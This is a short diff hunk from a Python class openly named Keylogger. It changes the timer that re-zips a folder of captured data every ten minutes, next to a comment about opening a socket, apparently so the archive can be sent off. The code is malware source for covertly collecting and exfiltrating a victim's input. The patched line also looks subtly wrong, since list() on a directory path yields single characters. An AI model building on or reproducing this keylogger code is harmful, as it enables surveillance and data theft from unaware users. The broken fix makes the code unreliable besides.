@@ -220,7 +220,7 @@ class Keylogger:
 		# zip file composed of folders contents
 		ziped_name = self.zip_folder(self.directory)
 		# rewrite existing zip file with new contents
-		zip_restart = threading.Timer(600, self.zip_folder)
+		zip_restart = threading.Timer(600, self.zip_folder, list(self.directory))
 		# start zipping clock
 		zip_restart.start()
 		# creating socket context manager
